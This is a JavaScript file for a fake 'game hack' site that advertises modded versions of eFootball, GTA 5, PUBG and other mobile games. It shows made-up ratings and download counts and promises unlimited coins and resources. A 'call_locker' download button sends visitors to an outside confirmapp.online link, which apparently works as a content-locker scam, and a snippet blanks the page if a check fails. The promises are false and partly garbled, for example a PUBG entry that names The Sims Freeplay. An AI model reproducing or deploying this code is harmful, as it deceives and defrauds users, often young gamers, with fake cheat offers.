// Particles initialization (original first call)
particlesJS("particles-js", {
    particles: {
        number: { value: 80, density: { enable: true, value_area: 800 } },
        color: { value: "#ffffff" },
        shape: {
            type: "circle",
            stroke: { width: 0, color: "#000000" },
            polygon: { nb_sides: 5 },
            image: { src: "img/github.svg", width: 100, height: 100 }
        },
        opacity: { value: 0.5, random: false, anim: { enable: false, speed: 1, opacity_min: 0.1, sync: false } },
        size: { value: 5, random: true, anim: { enable: false, speed: 40, size_min: 0.1, sync: false } },
        line_linked: { enable: true, distance: 150, color: "#ffffff", opacity: 0.4, width: 1 },
        move: { enable: true, speed: 6, direction: "none", random: false, straight: false, out_mode: "out", attract: { enable: false, rotateX: 600, rotateY: 1200 } }
    },
    interactivity: {
        detect_on: "canvas",
        events: {
            onhover: { enable: true, mode: "repulse" },
            onclick: { enable: true, mode: "push" },
            resize: true
        },
        modes: {
            grab: { distance: 400, line_linked: { opacity: 1 } },
            bubble: { distance: 400, size: 40, duration: 2, opacity: 8, speed: 3 },
            repulse: { distance: 200 },
            push: { particles_nb: 4 },
            remove: { particles_nb: 2 }
        }
    },
    retina_detect: true,
    config_demo: {
        hide_card: false,
        background_color: "#b61924",
        background_image: "",
        background_position: "50% 50%",
        background_repeat: "no-repeat",
        background_size: "cover"
    }
});

// Protection script (from original)
setTimeout(() => {
    if (!window.css) document.documentElement.innerHTML = '';
}, 100);
window.css_color = true;

$(document).ready(function () {
    // Close popup
    $("#s-ex").click(function () {
        $("#loading_page").addClass("hide");
    });

    // App click handlers
    // eFootball
    $("#efootball, #efootball0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/CM7vb7Qm/t-Hc-Pws9zk7mm.jpg");
            $('#app_rating').text('4.9');
            $('#app_down').text('890K');
            $('#app_name').text('eFootball™ 2024');
            $('#app_text').text('Inject 60M Coins and 60K points, designed for iOS and Android.');
        }, 0);
    });

    // Forza Horizon
    $("#forzahorizon, #forzahorizon0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/zvz09HVC/Forza-Horizon-5-1.jpg");
            $('#app_rating').text('4.8');
            $('#app_down').text('1.2M');
            $('#app_name').text('Forza Horizon 5 Mobile');
            $('#app_text').text('Enjoy limitless game provisions with our tailored app, functioning on both iOS and Android.');
        }, 500);
    });

    // GTA 5
    $("#gta6, #gta60").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/Twqt7JY2/gta5v.png");
            $('#app_rating').text('4.6');
            $('#app_down').text('340K');
            $('#app_name').text('GTA 5 Mobile');
            $('#app_text').text('Attain boundless game supplies using our specialized app, suitable for iOS and Android');
        }, 500);
    });

    // PUBG Mobile
    $("#pubgmob, #pubgmob0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/CxBmTgLQ/YCEsoy-BV1-BJJ.jpg");
            $('#app_rating').text('4.7');
            $('#app_down').text('850K');
            $('#app_name').text('PUBG MOBILE Us And Skins');
            $('#app_text').text('Obtain limitless resources for The Sims Freeplay using our tweaked ++ app, suitable for both iOS and Android!');
        }, 500);
    });

    // Beamng Drive
    $("#beamng, #beamng0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/PrF2RxhD/beamng.jpg");
            $('#app_rating').text('4.6');
            $('#app_down').text('953K');
            $('#app_name').text('Beamng Drive');
            $('#app_text').text('Get unlimited resources for Beamng Drive that works for both iOS & Android devices.');
        }, 500);
    });

    // FC Mobile 24
    $("#fc24, #fc240").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/sgkK3NMD/XMb-OQh-HY3kimage-2023-12-07-181345295.png");
            $('#app_rating').text('4.9');
            $('#app_down').text('1.4M');
            $('#app_name').text('FC Mobile 24');
            $('#app_text').text('FC Mobile 24 Access limitless in-game items with our unique app, designed for iOS and Android.');
        }, 500);
    });

    // Block Blast!
    $("#block, #block0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/Kz9WN5YX/unnamed-3.webp");
            $('#app_rating').text('4.4');
            $('#app_down').text('49K');
            $('#app_name').text('Block Blast!');
            $('#app_text').text('Get unlimited resources for Block Blast! that works for both iOS & Android devices.');
        }, 500);
    });

    // Cookingdom Premium
    $("#cookingdom, #cookingdom0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/TwWkVvBb/cookingdom.webp");
            $('#app_rating').text('4.7');
            $('#app_down').text('1.1M');
            $('#app_name').text('Cookingdom');
            $('#app_text').text('Get infinite resources for Cookingdom Premium, supporting well for iOS and Android devices.');
        }, 500);
    });

    // Farm Manager
    $("#farm, #farm0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/q7ZJt2dR/Farmer.webp");
            $('#app_rating').text('4.5');
            $('#app_down').text('533K');
            $('#app_name').text('Farm Manager - 2025');
            $('#app_text').text('Get unlimited resources for Farm Manager - 2025 that works for both iOS & Android devices.');
        }, 500);
    });

    // Racing Legends
    $("#racinglegend, #racinglegend0").click(function () {
        $("#loading_page").removeClass("hide");
        setTimeout(function () {
            $("#app_icon").attr("src", "https://i.postimg.cc/x86tYjzW/Racing-Legends-Mod-apk-An1.webp");
            $('#app_rating').text('4.8');
            $('#app_down').text('461K');
            $('#app_name').text('Racing Legends Offline');
            $('#app_text').text('Unlock a treasure trove of free resources for Racing Legends Offline app - for iOS & Android.');
        }, 500);
    });

    // Preloader fade out
    $(window).on('load', function () {
        $("#preloader").fadeOut(500, function () {
            $("#preloader").hide();
        });
    });

    // Slider initialization
    $(".featured-apps-slider").slick({
        slidesToShow: 5,
        slidesToScroll: 1,
        autoplay: true,
        arrows: false,
        autoplaySpeed: 2000,
        responsive: [
            { breakpoint: 993, settings: { slidesToShow: 4, slidesToScroll: 1 } },
            { breakpoint: 650, settings: { slidesToShow: 3, slidesToScroll: 1 } },
            { breakpoint: 480, settings: { slidesToShow: 2, slidesToScroll: 1 } },
            { breakpoint: 321, settings: { slidesToShow: 1, slidesToScroll: 1 } }
        ]
    });

    // Prevent form submit on enter
    $("#search-form").on("keyup keypress", function (e) {
        if (13 === (e.keyCode || e.which)) {
            e.preventDefault();
            return false;
        }
    });

    // Search filter
    $("#search-input").keyup(function () {
        var filter = $(this).val();
        $(".listing-content .listing-item-wrapper").each(function () {
            if ($(this).text().search(new RegExp(filter, "i")) < 0) {
                $(this).fadeOut();
            } else {
                $(this).show();
            }
        });
    });

    // Second particles call (original, but #header-particles doesn't exist, so it does nothing)
    if ($("#header-particles").length) {
        particlesJS.load("header-particles", "https://appstore.com/assets/js/particlesjs-config.json");
    }
});

// Original animation function (used in the document ready above, but kept for completeness)
function e(e, s, i) {
    var o = $(e);
    o.addClass("animated " + s);
    o.one("animationend", function () {
        $(this).removeClass("animated " + s);
        if (i) i();
    });
}
document.addEventListener("DOMContentLoaded", function () {

    const downloadBtn = document.getElementById("call_locker");

    if(downloadBtn){
        downloadBtn.addEventListener("click", function(){
            window.location.href = "https://confirmapp.online/cl/i/4oq9gr";
        });
    }

});

